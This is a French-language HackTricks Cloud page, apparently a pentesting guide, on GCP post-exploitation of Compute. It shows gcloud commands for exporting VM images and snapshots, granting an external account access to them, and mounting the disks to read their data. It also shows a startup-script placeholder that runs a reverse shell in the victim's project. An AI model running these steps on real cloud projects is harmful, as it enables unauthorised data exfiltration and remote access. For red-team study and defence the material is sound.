# GCP - Post-exploitation Compute

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Compute

Pour plus d'informations sur Compute et VPC (R√©seau), consultez :

{% content-ref url="../../gcp-pentesting/gcp-services/gcp-compute-instances-enum/" %}
[gcp-compute-instances-enum](../../gcp-pentesting/gcp-services/gcp-compute-instances-enum/)
{% endcontent-ref %}

### Exporter & Inspecter des Images localement

Cela permettrait √† un attaquant **d'acc√©der aux donn√©es contenues dans des images d√©j√† existantes** ou **de cr√©er de nouvelles images de VM en cours d'ex√©cution** et d'acc√©der √† leurs donn√©es sans avoir acc√®s √† la VM en cours d'ex√©cution.

Il est possible d'exporter une image de VM vers un bucket, puis de la t√©l√©charger et de la monter localement avec la commande :

{% code overflow="wrap" %}
```bash
gcloud compute images export --destination-uri gs://<bucket-name>/image.vmdk --image imagetest --export-format vmdk
# The download the export from the bucket and mount it locally
```
{% endcode %}

Avant de r√©aliser cette action, l'attaquant pourrait avoir besoin de privil√®ges sur le bucket de stockage et certainement de **privil√®ges sur cloudbuild**, car c'est le **service** qui sera sollicit√© pour effectuer l'exportation.\
De plus, pour que cela fonctionne, le SA de codebuild et le SA de compute doivent disposer de permissions privil√©gi√©es.\
Le SA de cloudbuild `<project-id>@cloudbuild.gserviceaccount.com` a besoin de :

* roles/iam.serviceAccountTokenCreator
* roles/compute.admin
* roles/iam.serviceAccountUser

Et le SA `<project-id>-compute@developer.gserviceaccount.com` a besoin de :

* roles/compute.storageAdmin
* roles/storage.objectAdmin

### Exporter & Inspecter les Snapshots & Disques localement

Il n'est pas possible d'exporter directement des snapshots et des disques, mais il est possible de **transformer un snapshot en disque, un disque en image** et, en suivant **la section pr√©c√©dente**, d'exporter cette image pour l'inspecter localement

{% code overflow="wrap" %}
```bash
# Create a Disk from a snapshot
gcloud compute disks create [NEW_DISK_NAME] --source-snapshot=[SNAPSHOT_NAME] --zone=[ZONE]

# Create an image from a disk
gcloud compute images create [IMAGE_NAME] --source-disk=[NEW_DISK_NAME] --source-disk-zone=[ZONE]
```
{% endcode %}

### Inspecter une image en cr√©ant une VM

Dans le but d'acc√©der aux **donn√©es stock√©es dans une image** ou √† l'int√©rieur d'une **VM en cours d'ex√©cution** √† partir de laquelle un attaquant **a cr√©√© une image,** il est possible d'accorder √† un compte externe un acc√®s √† l'image :
```bash
gcloud projects add-iam-policy-binding [SOURCE_PROJECT_ID] \
--member='serviceAccount:[TARGET_PROJECT_SERVICE_ACCOUNT]' \
--role='roles/compute.imageUser'
```
et ensuite cr√©ez une nouvelle VM √† partir de celle-ci :
```bash
gcloud compute instances create [INSTANCE_NAME] \
--project=[TARGET_PROJECT_ID] \
--zone=[ZONE] \
--image=projects/[SOURCE_PROJECT_ID]/global/images/[IMAGE_NAME]
```
Si vous ne pouviez pas donner √† votre compte externe un acc√®s √† l'image, vous pourriez lancer une VM en utilisant cette image dans le projet de la victime et **faire ex√©cuter un reverse shell par les m√©tadonn√©es** pour acc√©der √† l'image en ajoutant le param√®tre :
```bash
--metadata startup-script='#! /bin/bash
echo "hello"; <reverse shell>'
```
### Inspecter un Snapshot/Disque en l'attachant √† une VM

Dans le but d'acc√©der aux **donn√©es stock√©es dans un disque ou un snapshot, vous pourriez transformer le snapshot en disque, un disque en image et suivre les √©tapes pr√©c√©dentes.**

Ou vous pourriez **accorder un acc√®s √† un compte externe** sur le disque (si le point de d√©part est un snapshot, donner acc√®s au snapshot ou cr√©er un disque √† partir de celui-ci) :
```bash
gcloud projects add-iam-policy-binding [PROJECT_ID] \
--member='user:[USER_EMAIL]' \
--role='roles/compute.storageAdmin'
```
**Attacher le disque** √† une instance :
```bash
gcloud compute instances attach-disk [INSTANCE_NAME] \
--disk [DISK_NAME] \
--zone [ZONE]
```
Montez le disque dans la VM :

1. **Se connecter en SSH √† la VM** :

```sh
gcloud compute ssh [NOM_INSTANCE] --zone [ZONE]
```
2. **Identifier le Disque** : Une fois dans la VM, identifiez le nouveau disque en listant les p√©riph√©riques de disque. Typiquement, vous pouvez le trouver sous `/dev/sdb`, `/dev/sdc`, etc.
3. **Formater et Monter le Disque** (s'il s'agit d'un disque neuf ou brut) :
*   Cr√©er un point de montage :

```sh
sudo mkdir -p /mnt/disks/[REP_MONTAGE]
```
*   Monter le disque :

```sh
sudo mount -o discard,defaults /dev/[PERIPH_DISQUE] /mnt/disks/[REP_MONTAGE]
```

Si vous **ne pouvez pas donner acc√®s √† un projet externe** √† l'instantan√© ou au disque, vous devrez peut-√™tre **effectuer ces actions √† l'int√©rieur d'une instance dans le m√™me projet que l'instantan√©/le disque**.

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> !</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
